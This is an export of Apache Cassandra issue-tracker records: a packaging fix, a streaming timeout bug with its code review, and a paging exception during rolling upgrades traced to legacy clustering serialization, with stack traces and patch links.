I have attached a patch that should fix this issue.",,bereng,dylrich,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Apr/22 16:15;dylrich;patch;https://issues.apache.org/jira/secure/attachment/13041951/patch",,,,,1.0,brandon.williams,,,,,,,,,,,,,,Packaging,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Apr 13 12:13:10 UTC 2022,,,,,,,All,,,,"0|z113hs:",9223372036854775807,,,,bereng,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/84bc0e8c3b126199653ba34a7aea81999de89dde,,,,,,,,,"run CI, test packages",,,,,"04/Apr/22 19:57;brandon.williams;Also added procps to the Debian packaging:

||Branch||CI||
|[3.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17516-3.0]|[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1561/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1561/pipeline]|
|[3.11|https://github.com/driftx/cassandra/tree/CASSANDRA-17516-3.11]|[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1563/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1563/pipeline]|
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17516-4.0]|[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1564/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1564/pipeline]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17516-trunk]|[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1565/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1565/pipeline]|
;;;","11/Apr/22 06:19;bereng;Trunk seems to be off. Probably an env or unlucky run issue. Assuming that is fixed and doublechecked +1;;;","11/Apr/22 18:28;brandon.williams;Looks like env issues, and since only packaging changed and it's the same between branches it _shouldn't_ matter, but let's do another run to be sure: [!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1603/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1603/pipeline]
;;;","12/Apr/22 04:46;bereng;Yep LGTM +1 (and I also notice there are no more upgrade errors from 17140 :-) );;;","13/Apr/22 12:13;brandon.williams;Committed, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Streaming sessions longer than 3 minutes fail with timeout,CASSANDRA-17510,13436946,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jonmeredith,jonmeredith,jonmeredith,31/Mar/22 16:08,27/May/22 19:25,13/Jul/23 08:40,01/Apr/22 23:04,4.1,4.1-alpha1,,,,,Consistency/Streaming,,,,0,,"Streaming sessions that take longer than 3 minutes will fail with an InputTimeoutException on the streaming control channel connection.

CASSANDRA-16927 refactored the streaming code as part of CEP-10 to clean up some abstractions. As part of those changes the StreamDeserializingTask (formerly StreamingInboundHandler) had a check removed that ensured data was present before reading from the AsyncStreamingInputPlus used by NettyStreamingChannel to pass incoming bytes to be deserialized off the main Netty event loop threads. When {{reBuffer}ing from the input, AsyncStreamingInputPlus times out if no data is received in three minutes.

It is perfectly valid for no messages to be received over the control connection for longer than three minutes - pre CASSANDRA-16927 just doesn’t do the read until data is present, so it doesn’t hit the timeout. A possible solution is to replace throwing the InputTimeoutException with a check that the channel is still open and retry.

Note this is unrelated to the streaming protocol KeepAlive removal - that had a default timeout of five minutes so would not have been effective anyway.",,benedict,jonmeredith,maedhroz,,,,,,,,,,,,"maedhroz commented on a change in pull request #1541:
URL: https://github.com/apache/cassandra/pull/1541#discussion_r839844149



##########
File path: test/unit/org/apache/cassandra/net/AsyncStreamingInputPlusTest.java
##########
@@ -34,8 +34,6 @@
 import io.netty.buffer.Unpooled;
 import io.netty.channel.embedded.EmbeddedChannel;
 import org.apache.cassandra.io.util.BufferedDataOutputStreamPlus;
-import org.apache.cassandra.net.AsyncStreamingInputPlus;
-import org.apache.cassandra.net.AsyncStreamingInputPlus.InputTimeoutException;
 
 import static org.apache.cassandra.utils.Clock.Global.nanoTime;

Review comment:
       unused




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;31/Mar/22 17:11;githubbot;600","maedhroz commented on a change in pull request #1541:
URL: https://github.com/apache/cassandra/pull/1541#discussion_r839844372



##########
File path: test/unit/org/apache/cassandra/net/AsyncStreamingInputPlusTest.java
##########
@@ -34,8 +34,6 @@
 import io.netty.buffer.Unpooled;
 import io.netty.channel.embedded.EmbeddedChannel;
 import org.apache.cassandra.io.util.BufferedDataOutputStreamPlus;
-import org.apache.cassandra.net.AsyncStreamingInputPlus;
-import org.apache.cassandra.net.AsyncStreamingInputPlus.InputTimeoutException;
 
 import static org.apache.cassandra.utils.Clock.Global.nanoTime;

Review comment:
       also `import java.util.concurrent.TimeUnit;` is unused




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;31/Mar/22 17:12;githubbot;600","maedhroz commented on a change in pull request #1541:
URL: https://github.com/apache/cassandra/pull/1541#discussion_r839974141



##########
File path: src/java/org/apache/cassandra/net/AsyncStreamingInputPlus.java
##########
@@ -217,23 +209,31 @@ public void close()
             buffer = null;
         }
 
-        while (true)
+        do
         {
             try
             {
-                ByteBuf buf = queue.poll(Long.MAX_VALUE, TimeUnit.NANOSECONDS);
+                ByteBuf buf = queue.poll(DEFAULT_REBUFFER_BLOCK_IN_MILLIS, TimeUnit.MILLISECONDS);
                 if (buf == Unpooled.EMPTY_BUFFER)
+                {
+                    isClosed = true;
                     break;
-                else
+                }
+                else if (buf != null)
+                {
                     buf.release();
+                }
             }
-            catch (InterruptedException e)
+            catch (InterruptedException ie)
             {
-                //
+                throw new UncheckedInterruptedException(ie);
             }
-        }
+        } while (channel.isRegistered());
 
-        isClosed = true;
+        if (!channel.isRegistered())
+        {
+            throw new IllegalStateException(""AsyncStreamingInputPlus did not complete close before channel was unregistered"");
+        }

Review comment:
       nit/style: I don't remember what our style guide says, but I'd be fine with getting rid of the braces for one-liners




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;31/Mar/22 20:03;githubbot;600","maedhroz commented on a change in pull request #1541:
URL: https://github.com/apache/cassandra/pull/1541#discussion_r840193777



##########
File path: test/unit/org/apache/cassandra/net/AsyncStreamingInputPlusTest.java
##########
@@ -161,6 +129,61 @@ public void available_ClosedButWithBytes()
         Assert.assertEquals(size, inputPlus.unsafeAvailable());
     }
 
+    @Test
+    public void rebufferAndCloseToleratesInterruption() throws InterruptedException
+    {
+        ByteBuf beforeInterrupt = channel.alloc().heapBuffer(1024);
+        beforeInterrupt.writeCharSequence(""BEFORE"", Charset.forName(""us-ascii""));

Review comment:
       ```suggestion
           beforeInterrupt.writeCharSequence(""BEFORE"", StandardCharsets.US_ASCII);
   ```




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;01/Apr/22 03:00;githubbot;600","maedhroz commented on a change in pull request #1541:
URL: https://github.com/apache/cassandra/pull/1541#discussion_r840202264



##########
File path: test/unit/org/apache/cassandra/net/AsyncStreamingInputPlusTest.java
##########
@@ -161,6 +129,61 @@ public void available_ClosedButWithBytes()
         Assert.assertEquals(size, inputPlus.unsafeAvailable());
     }
 
+    @Test
+    public void rebufferAndCloseToleratesInterruption() throws InterruptedException
+    {
+        ByteBuf beforeInterrupt = channel.alloc().heapBuffer(1024);
+        beforeInterrupt.writeCharSequence(""BEFORE"", Charset.forName(""us-ascii""));
+        final int beforeInterruptBytes = beforeInterrupt.readableBytes();
+        ByteBuf afterInterrupt = channel.alloc().heapBuffer(1024);
+        afterInterrupt.writeCharSequence(""AFTER"", Charset.forName(""us-ascii""));
+        final int afterInterruptBytes = afterInterrupt.readableBytes();
+
+        inputPlus = new AsyncStreamingInputPlus(channel);
+        Thread consumer = new Thread(() -> {
+            try
+            {
+                byte[] buffer = new byte[beforeInterruptBytes + afterInterruptBytes];
+                inputPlus.read(buffer, 0, beforeInterruptBytes + afterInterruptBytes);

Review comment:
       Would it be worth it to throw a quick check for the number of bytes read?
   
   ```
   int bytesRead = inputPlus.read(buffer, 0, beforeInterruptBytes + afterInterruptBytes);
   assertEquals(buffer.length, bytesRead);
   ```




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;01/Apr/22 03:28;githubbot;600","jonmeredith commented on a change in pull request #1541:
URL: https://github.com/apache/cassandra/pull/1541#discussion_r840675480



##########
File path: test/unit/org/apache/cassandra/net/AsyncStreamingInputPlusTest.java
##########
@@ -161,6 +129,61 @@ public void available_ClosedButWithBytes()
         Assert.assertEquals(size, inputPlus.unsafeAvailable());
     }
 
+    @Test
+    public void rebufferAndCloseToleratesInterruption() throws InterruptedException
+    {
+        ByteBuf beforeInterrupt = channel.alloc().heapBuffer(1024);
+        beforeInterrupt.writeCharSequence(""BEFORE"", Charset.forName(""us-ascii""));

Review comment:
       Much better.

##########
File path: test/unit/org/apache/cassandra/net/AsyncStreamingInputPlusTest.java
##########
@@ -161,6 +129,61 @@ public void available_ClosedButWithBytes()
         Assert.assertEquals(size, inputPlus.unsafeAvailable());
     }
 
+    @Test
+    public void rebufferAndCloseToleratesInterruption() throws InterruptedException
+    {
+        ByteBuf beforeInterrupt = channel.alloc().heapBuffer(1024);
+        beforeInterrupt.writeCharSequence(""BEFORE"", Charset.forName(""us-ascii""));
+        final int beforeInterruptBytes = beforeInterrupt.readableBytes();
+        ByteBuf afterInterrupt = channel.alloc().heapBuffer(1024);
+        afterInterrupt.writeCharSequence(""AFTER"", Charset.forName(""us-ascii""));
+        final int afterInterruptBytes = afterInterrupt.readableBytes();
+
+        inputPlus = new AsyncStreamingInputPlus(channel);
+        Thread consumer = new Thread(() -> {
+            try
+            {
+                byte[] buffer = new byte[beforeInterruptBytes + afterInterruptBytes];
+                inputPlus.read(buffer, 0, beforeInterruptBytes + afterInterruptBytes);

Review comment:
       Can't hurt.




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;01/Apr/22 15:07;githubbot;600","jonmeredith commented on pull request #1541:
URL: https://github.com/apache/cassandra/pull/1541#issuecomment-1086400673


   Merged


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;01/Apr/22 23:04;githubbot;600","jonmeredith closed pull request #1541:
URL: https://github.com/apache/cassandra/pull/1541


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;01/Apr/22 23:04;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,4800,,,0,4800,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jonmeredith,,,,,,,,,,,,,,Availability -> Process Crash,,,,,,,,Normal,Adhoc Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Apr 01 19:07:12 UTC 2022,,,,,,,All,,,,"0|z110qo:",9223372036854775807,,,,benedict,maedhroz,,,Critical,,4.1,,https://github.com/apache/cassandra/commit/6b092b8570684ca49918e2ace03de6baf1d5a52b,,,,,,,,,"[PR|https://github.com/jonmeredith/cassandra/pull/new/C17510-streaming-three-min-timeout]
[Branch|https://github.com/jonmeredith/cassandra/tree/C17510-streaming-three-min-timeout]
[CircleCI|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=C17510-streaming-three-min-timeout&filter=all]",,,,,"31/Mar/22 16:12;jonmeredith;Observed on a host replacement in a test cluster.;;;","31/Mar/22 16:15;jonmeredith;[PR|https://github.com/jonmeredith/cassandra/pull/new/C17510-streaming-three-min-timeout] 
[Branch|https://github.com/jonmeredith/cassandra/tree/C17510-streaming-three-min-timeout] 
[CircleCI|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=C17510-streaming-three-min-timeout&filter=all];;;","01/Apr/22 03:29;maedhroz;+1

 

(Left a couple more minor comments in the PR);;;","01/Apr/22 17:03;benedict;LGTM;;;","01/Apr/22 19:07;jonmeredith;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|trunk|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17510-trunk-B3E1BE3E-2AA9-476D-BD84-B1705032EA2F]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17510-trunk-B3E1BE3E-2AA9-476D-BD84-B1705032EA2F]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1554/]|;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
IllegalArgumentException in query code path during 3.11.12 => 4.0.3 rolling upgrade,CASSANDRA-17507,13436886,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,adelapena,tsteinmaurer,tsteinmaurer,31/Mar/22 12:27,24/Jan/23 09:32,13/Jul/23 08:40,23/Jan/23 11:50,4.0.8,4.1.1,5.0,,,,Consistency/Coordination,,,,0,,"In a 6 node 3.11.12 test cluster - freshly set up, thus no legacy SSTables etc. - with ~ 1TB SSTables on disk per node, I have been running a rolling upgrade to 4.0.3. On upgraded 4.0.3 nodes I then have seen the following exception regularly, which disappeared once all 6 nodes have been on 4.0.3. Is this known? Can this be ignored? As said, just a test drive, but not sure if we want to have that in production, especially with a larger number of nodes, where it could take some time, until all are upgraded. Thanks!
{code}
ERROR [Native-Transport-Requests-8] 2022-03-30 11:30:24,057 ErrorMessage.java:457 - Unexpected exception during request
java.lang.IllegalArgumentException: newLimit > capacity: (290 > 15)
        at java.base/java.nio.Buffer.createLimitException(Buffer.java:372)
        at java.base/java.nio.Buffer.limit(Buffer.java:346)
        at java.base/java.nio.ByteBuffer.limit(ByteBuffer.java:1107)
        at java.base/java.nio.ByteBuffer.limit(ByteBuffer.java:262)
        at org.apache.cassandra.db.marshal.ByteBufferAccessor.slice(ByteBufferAccessor.java:107)
        at org.apache.cassandra.db.marshal.ByteBufferAccessor.slice(ByteBufferAccessor.java:39)
        at org.apache.cassandra.db.marshal.ValueAccessor.sliceWithShortLength(ValueAccessor.java:225)
        at org.apache.cassandra.db.marshal.CompositeType.splitName(CompositeType.java:222)
        at org.apache.cassandra.service.pager.PagingState$RowMark.decodeClustering(PagingState.java:434)
        at org.apache.cassandra.service.pager.PagingState$RowMark.clustering(PagingState.java:388)
        at org.apache.cassandra.service.pager.SinglePartitionPager.nextPageReadQuery(SinglePartitionPager.java:88)
        at org.apache.cassandra.service.pager.SinglePartitionPager.nextPageReadQuery(SinglePartitionPager.java:32)
        at org.apache.cassandra.service.pager.AbstractQueryPager.fetchPage(AbstractQueryPager.java:69)
        at org.apache.cassandra.service.pager.SinglePartitionPager.fetchPage(SinglePartitionPager.java:32)
        at org.apache.cassandra.cql3.statements.SelectStatement$Pager$NormalPager.fetchPage(SelectStatement.java:352)
        at org.apache.cassandra.cql3.statements.SelectStatement.execute(SelectStatement.java:400)
        at org.apache.cassandra.cql3.statements.SelectStatement.execute(SelectStatement.java:250)
        at org.apache.cassandra.cql3.statements.SelectStatement.execute(SelectStatement.java:88)
        at org.apache.cassandra.cql3.QueryProcessor.processStatement(QueryProcessor.java:244)
        at org.apache.cassandra.cql3.QueryProcessor.processPrepared(QueryProcessor.java:723)
        at org.apache.cassandra.cql3.QueryProcessor.processPrepared(QueryProcessor.java:701)
        at org.apache.cassandra.transport.messages.ExecuteMessage.execute(ExecuteMessage.java:159)
        at org.apache.cassandra.transport.Message$Request.execute(Message.java:242)
        at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:86)
        at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:106)
        at org.apache.cassandra.transport.Dispatcher.lambda$dispatch$0(Dispatcher.java:70)
        at java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515)
        at org.apache.cassandra.concurrent.AbstractLocalAwareExecutorService$FutureTask.run(AbstractLocalAwareExecutorService.java:165)
        at org.apache.cassandra.concurrent.SEPWorker.run(SEPWorker.java:119)
        at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
        at java.base/java.lang.Thread.run(Thread.java:829)
{code}",,adelapena,bereng,brandon.williams,kkierer,rtib,star_lord,tsteinmaurer,,,,,,,,"adelapena opened a new pull request, #2082:
URL: https://github.com/apache/cassandra/pull/2082

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;11/Jan/23 13:36;githubbot;600","adelapena opened a new pull request, #2083:
URL: https://github.com/apache/cassandra/pull/2083

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;11/Jan/23 15:36;githubbot;600","adelapena opened a new pull request, #2084:
URL: https://github.com/apache/cassandra/pull/2084

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;11/Jan/23 15:36;githubbot;600","adelapena commented on PR #2084:
URL: https://github.com/apache/cassandra/pull/2084#issuecomment-1386910944

   @pkolaczk thanks for the review :)
   
   


;18/Jan/23 11:34;githubbot;600","bereng commented on code in PR #2082:
URL: https://github.com/apache/cassandra/pull/2082#discussion_r1083664007


##########
NEWS.txt:
##########
@@ -51,6 +51,20 @@ restore snapshots created with the previous major version using the
 'sstableloader' tool. You can upgrade the file format of your snapshots
 using the provided 'sstableupgrade' tool.
 
+4.0.8
+=====
+
+New features
+------------
+
+Upgrading
+---------
+    - All previous versions of 4.x contained a mistake on the implementation of the old CQL native protocol v3. That
+     mistake produced issues when paging over tables with compact storage and a single clustering column during rolling
+     upgrades involving 3.x and 4.x nodes. The fix for that issue makes that it can now appear during rolling upgrades
+     from 4.0.0-4.0.7. If that your case, please use protocol v4 or higher in your driver. See CASSANDRA-17507 for

Review Comment:
   - `The fix for that issue makes that it can now appear` -> `The fix for that issue makes ***it that*** it can now appear`?
   - `if that _is/were_ your case`?



;23/Jan/23 05:39;githubbot;600","smiklosovic closed pull request #2084: CASSANDRA-17507 trunk: Fix legacy clustering serialization for paging with compact storage
URL: https://github.com/apache/cassandra/pull/2084


;24/Jan/23 09:32;githubbot;600","smiklosovic closed pull request #2083: CASSANDRA-17507 4.1: Fix legacy clustering serialization for paging with compact storage
URL: https://github.com/apache/cassandra/pull/2083


;24/Jan/23 09:32;githubbot;600","smiklosovic closed pull request #2082: CASSANDRA-17507 4.0: Fix legacy clustering serialization for paging with compact storage
URL: https://github.com/apache/cassandra/pull/2082


;24/Jan/23 09:32;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,4800,,,0,4800,,,,,,,,,,,,,,,,,,,,,CASSANDRA-16217,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,adelapena,,,,,,,,,,,,,,Correctness -> Transient Incorrect Response,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Jan 23 11:50:10 UTC 2023,,,,,,,All,,,,"0|z110dk:",9223372036854775807,,,,bereng,pkolaczk,,,Normal,,4.0.0,,https://github.com/apache/cassandra/commit/9a0af4112e87f5b97056aa39e63c5ab461b60237,,,,,,,,,New JVM upgrade dtests are included.,,,,,"04/Apr/22 05:46;tsteinmaurer;According to [https://the-asf.slack.com/archives/CJZLTM05A/p1648727883515419,] not known, possibly a bug causing queries to fail during the rolling upgrade, thus I have opened this ticket.;;;","27/Oct/22 18:09;star_lord;This exists during an upgrade from 3.11 to Cassandra 4.0.6 as well.
Was hoping that https://issues.apache.org/jira/browse/CASSANDRA-17840 had fixed it in 4.0.6, but that doesn't appear to be the case.
Selecting the columns individually does work-around the issue when Select * fails until all nodes are upgraded.

{code:java}
ERROR [Native-Transport-Requests-4] 2022-10-03 10:51:50,178 ErrorMessage.java:457 - Unexpected exception during request
java.lang.IllegalArgumentException: null
        at java.nio.Buffer.limit(Buffer.java:275)
        at org.apache.cassandra.db.marshal.ByteBufferAccessor.slice(ByteBufferAccessor.java:107)
        at org.apache.cassandra.db.marshal.ByteBufferAccessor.slice(ByteBufferAccessor.java:39)
        at org.apache.cassandra.db.marshal.ValueAccessor.sliceWithShortLength(ValueAccessor.java:225)
        at org.apache.cassandra.db.marshal.CompositeType.splitName(CompositeType.java:222)
        at org.apache.cassandra.service.pager.PagingState$RowMark.decodeClustering(PagingState.java:434)
        at org.apache.cassandra.service.pager.PagingState$RowMark.clustering(PagingState.java:388)
        at org.apache.cassandra.service.pager.SinglePartitionPager.nextPageReadQuery(SinglePartitionPager.java:88)
        at org.apache.cassandra.service.pager.SinglePartitionPager.nextPageReadQuery(SinglePartitionPager.java:32)
        at org.apache.cassandra.service.pager.AbstractQueryPager.fetchPage(AbstractQueryPager.java:69)
        at org.apache.cassandra.service.pager.SinglePartitionPager.fetchPage(SinglePartitionPager.java:32)
        at org.apache.cassandra.cql3.statements.SelectStatement$Pager$NormalPager.fetchPage(SelectStatement.java:352)
        at org.apache.cassandra.cql3.statements.SelectStatement.execute(SelectStatement.java:400)
        at org.apache.cassandra.cql3.statements.SelectStatement.execute(SelectStatement.java:250)
        at org.apache.cassandra.cql3.statements.SelectStatement.execute(SelectStatement.java:88)
        at org.apache.cassandra.cql3.QueryProcessor.processStatement(QueryProcessor.java:244)
        at org.apache.cassandra.cql3.QueryProcessor.processPrepared(QueryProcessor.java:723)
        at org.apache.cassandra.cql3.QueryProcessor.processPrepared(QueryProcessor.java:701)
        at org.apache.cassandra.transport.messages.ExecuteMessage.execute(ExecuteMessage.java:159)
        at org.apache.cassandra.transport.Message$Request.execute(Message.java:242)
        at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:86)
        at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:106)
        at org.apache.cassandra.transport.Dispatcher.lambda$dispatch$0(Dispatcher.java:70)
        at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)
        at org.apache.cassandra.concurrent.AbstractLocalAwareExecutorService$FutureTask.run(AbstractLocalAwareExecutorService.java:165)
        at org.apache.cassandra.concurrent.AbstractLocalAwareExecutorService$LocalSessionFutureTask.run(AbstractLocalAwareExecutorService.java:137)
        at org.apache.cassandra.concurrent.SEPWorker.run(SEPWorker.java:119)
        at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
        at java.lang.Thread.run(Thread.java:748)
{code}


;;;","09/Jan/23 14:12;adelapena;[This JVM dtest|https://github.com/apache/cassandra/compare/cassandra-4.0...adelapena:cassandra:17507-4.0-repro] reproduces the bug. It testes a 3.x -> 4.0 rolling upgrade scenario with a table with {{COMPACT STORAGE}} and a query over that uses paging. The bug only seems to manifest itself when the driver uses native protocol v3, instead on the default (v5 for 4.0 and v4 for 3.11).

The tests results can be found [here|https://app.circleci.com/pipelines/github/adelapena/cassandra/2536/workflows/5791569d-8ea1-42b5-bacd-bd8716afaee8/jobs/25163]. The artifacts stored for each test contain an identical stack trace, for example [this one|https://output.circle-artifacts.com/output/job/f4cbecbc-92dd-49c8-a75d-a5a7b53bcd21/artifacts/0/stdout/fails/1/org.apache.cassandra.distributed.upgrade.CompactStoragePagingTest%23testPagingWithCompactStorageAndProtocolVersion.txt]

If this is actually caused by the combination of {{COMPACT STORAGE}}, paging and an old protocol version, probably the easiest workaround until we get a fix is setting the driver to use a more recent version of the native transport protocol.;;;","11/Jan/23 13:38;adelapena;I think I have found the cause of the bug when using protocol v3.

Cassandra 3.0 and 3.x with protocol v3 and compact storage don't serialize single-column clusterings as single-element composites. Instead, single-column clusterings values are written as they are, as it can be seen [here|https://github.com/apache/cassandra/blob/cassandra-3.11/src/java/org/apache/cassandra/db/LegacyLayout.java#L477-L486].

However, Cassandra 4.0 always reads and writes single-column clusterings as composites. This can be seen [here|https://github.com/apache/cassandra/blob/cassandra-4.0.3/src/java/org/apache/cassandra/service/pager/PagingState.java#L434], exactly where the reported exception is thrown.

I think the solution is modifying the code to read legacy formats in Cassandra 4.0 so it special cases single-column clusterings for compact storage:
||PR||CI||
|[4.0|https://github.com/apache/cassandra/pull/2082]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2540/workflows/22cfa989-31df-4fcc-a896-f46c8d77d364]|

If the approach looks good I'll prepare patches for 4.1 and trunk, that probably are also affected.;;;","11/Jan/23 15:45;adelapena;I can confirm that 4.1 and trunk are also affected. Here are the patches for all the branches:
||PR||CI||
|[4.0|https://github.com/apache/cassandra/pull/2082]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2543/workflows/cb16ec9d-8ec6-4914-a08a-92715bd15ff0]|
|[4.1|https://github.com/apache/cassandra/pull/2083]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2544/workflows/924c41ce-accb-44eb-be07-1fc678b1f4b2]|
